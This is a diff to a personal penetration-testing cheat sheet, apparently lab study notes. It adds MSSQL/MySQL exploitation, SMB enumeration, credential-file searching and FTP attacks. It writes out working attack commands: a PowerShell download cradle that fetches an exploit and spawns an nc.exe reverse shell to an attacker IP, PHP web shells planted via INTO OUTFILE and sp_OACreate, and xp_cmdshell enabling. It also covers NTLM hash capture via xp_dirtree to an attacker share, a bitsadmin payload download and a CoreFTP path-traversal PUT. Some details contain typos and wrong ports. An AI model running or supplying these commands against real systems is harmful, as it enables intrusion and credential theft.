@@ -14,11 +14,15 @@
     - [Schedule Tasks](#schedule-tasks)
     - [Logon as Trigger](#logon-as-trigger)
     - [Login Screen](#login-screen)
-    - [Web shell | mssql](#web-shell--mssql)
+    - [Web shell | mssql | mysql](#web-shell--mssql--mysql)
+      - [Queries](#queries)
+        - [MySQL](#mysql)
+        - [MSSQL](#mssql)
   - [Powershell](#powershell)
     - [Enumeration](#enumeration)
   - [SMB - 445](#smb---445)
     - [SMBMAP](#smbmap)
+  - [FTP - 32](#ftp---32)
 - [RDP](#rdp)
 - [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
   - [GUI bypass](#gui-bypass)
@@ -126,6 +130,9 @@
   - psexec (psexec -accepteula -i -s cmd.exe)
   - psexec \\IP -accepteula -i -s DOMAIN\User run_smt
   - psexec \@hostname. -accepteula -i -s DOMAIN\User run_smt
+  - Impacket SMBExec / impacket atexec
+    - impacket-psexec user:pass@domain
+  - crackmapexec smbexec atexec
   
 - **Sysmon**
   - event log: process, network, file change and creation
@@ -271,8 +278,15 @@
   - net start
   - nslookup
 
+```
+# Examples
+
+(Get-ChildItem -File -Recurse | Measure-Object).Count
+Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
+```
+
 - findstr = grep
-- 
 ### Windows: get file
   - powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
     - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
@@ -431,9 +445,158 @@ python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/D
   - Ease access 
   - c:\Windows\System32\sethc.exe
 
-#### Web shell | mssql
+#### Web shell | mssql | mysql
 - web shell to web directory
 - default web server: iis apppool\defaultapppool
+- mssql: tcp:1443 | upd:1434
+- mysql: tco:3306 | tcp:2433
+
+- **sqsh**: shell database
+  - sqsh -S $TARGET -U user -p pass
+  - sqsh -S $TARGET -U .\\USER -P 'PASS' -h = domain
+- **impacket-mssqlclient**
+  - impacket-mssqlclient -p PORT user@$target
+- **mysql**
+  - mysql -h $TARGET -U user -pPass
+  - sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+    - -y (SQLCMDMAXVARTYPEWIDTH) 
+    - -Y (SQLCMDMAXFIXEDTYPEWIDTH) 
+
+##### Queries
+
+###### MySQL
+```
+myslq: system db
+information_schema: db metadata
+performace_schema:  monitoring
+sys:                interperte performance schema
+```
+
+- Queries
+```
+Show Databases;
+Select name FROM master.dbo.sysdatabases
+USE db_name;
+SHOW TABLES;
+Select table_name FROM db_name.INFORMATION_SCHEMA.TABLES
+Select * from table_name;
+```
+
+- Commands
+```
+- xp_cmdshell
+xp_cmdshell 'COMMAND'
+```
+
+- Enable xp_cmdshell
+```
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+```
+
+- Write Files
+```
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+show variables like "secure_file_priv"; = read/write 
+```
+
+- Enable Ole Automation Procedures
+```
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+```
+
+- Read files
+
+```
+select LOAD_FILE("/etc/passwd");
+```
+
+###### MSSQL 
+```
+master:             info about instance
+msdb:               for SQL server agent
+model:              template
+resource:           read-only db
+tempdb:             temporary files
+```
+
+- [Queries](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/1-enumeration.md)
+
+- Create file
+```
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+```
+
+- Read files
+```
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+```
+
+- Grab hash
+```
+# Start responder
+responder | smbserver share ./ -smb2support
+
+# xp_subdirs/xp_dirtree
+
+EXEC master..xp_dirtree '\\$ATTACKER\share\'
+EXEC master..xp_subdirs '\\$ATTACKER\share\'
+hashcat 5600 (NTLMv2)
+```
+
+- Impersonate
+1. Identify users
+
+```
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+```
+
+2. Check current role
+```
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+
+3. Impersonate
+```
+EXECUTE AS LOGIN = 'sa'
+back to 2.
+
+# Revert
+REVERT
+
+
+- All users have access to master db
+* USE master
+```
+
+- External DBs
+4. show remotes
+  
+```
+SELECT srvname, isremote FROM sysservers
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+```
+
+- GUI: [dbeaver](https://github.com/dbeaver/dbeaver)
+
+
 
 ### Powershell
 - .NET framkework: software plattform für windows
@@ -473,6 +636,7 @@ python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/D
  - Sort-Object
 - Find FIle
   - Get-ChildItem -Recurse -Path "C:\" | Where-Object {$_.Name -match 'interesting*'}
+  - Get-ChildItem \\IP-SMB\share
     - -Recurse
     - -Force
     - -Hidden
@@ -520,11 +684,12 @@ python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/D
 ### SMB - 445
 - Server Message BLock
 - share of files on the network
+- rpcclient '%' $TARGET
+  - enumdomusers, netshareenumall
+  - enum4linux $TARGET -A -C
 - Commands
-  - smbmap -H $target = Check Privileges 
-  - smbmap -H $target -R --depth 5
-  - smbclient -L //$target -U admin/administrator
   - smbclient -L //$target/ = List Shares
+  - smbclient -L //$target -U admin/administrator
   - smbclient //$target/Users = Interactive shell to a share 
   - smbclient  \\\\$target\\share$ = Open a Null Session
   - smbclient //friendzone.htb/general -U "" = see files inside
@@ -562,6 +727,24 @@ sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username 
 
 # Connect to the SMB server
 net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
+net use n: \\ATTACKER_IP\share /USER:user s3cureP@ssword 
+dir n: /a-d /s /b | find /c ":\\"= not directories, bare format | count
+dir n:\*cred* /s /b
+
+# Powershell
+## Create object credential
+$username = 'plaintext'
+$password = 'Password123'
+pass = convertto-securestring $password -asplain -force
+
+# Option 1
+$cred = new-object system.management.automation.pscredential('htb\john', $pass)
+
+# Option 2
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+
+New-PSDrive -Name "N" -Root "\\Attacker\share" -PSProvider "FileSystem" -Credential $cred
+New-PSDrive -Name "N" -Root "\\ATTACKER_IP\share -PSProvider "FileSystem"
 
 # retrieve the files on the share
 copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
@@ -571,6 +754,8 @@ net use \\ATTACKER_IP\share /del
 ```
 
 - **enum4linux**
+- [SMBGhost](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)
+
 
 #### SMBMAP
 - Default
@@ -585,12 +770,25 @@ net use \\ATTACKER_IP\share /del
   - -x COMMANDS
 - Download
 
-  - smbmap -u USER -H $target -r /ShareNAME/Folder ---download /Path/to/file
+  - smbmap -u USER -H $target -r /ShareNAME/Folder ---download "share/file.ext"
 - Options
   - -H: host
   - -r: path
   - -u: User
   - -p: password
+
+### FTP - 32
+- ftp $TARGET
+  - mget | get
+  - mput | put
+
+- Bounce attack: deliver outbound traffic to anotehr device
+  - nmap -p 80 -b user:pass@$TARGET INTERNAL_IP
+
+```
+# CoreFTP attack
+curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+```
 
 ## RDP
 - Basic login
@@ -818,9 +1016,12 @@ $snap.LogPipelineExecutionDetails = $false
 - bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
 
 #### FindStr
+- dir n: /a-d /s /b | find /c ":\\"= not directories, bare format | count
+- dir n:\*cred* /s /b
 - grep
 - used to download from SMB
   - findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+  - findstr /s /i cred n:\*.*
 
 #### Execution
 - Indirect command execution
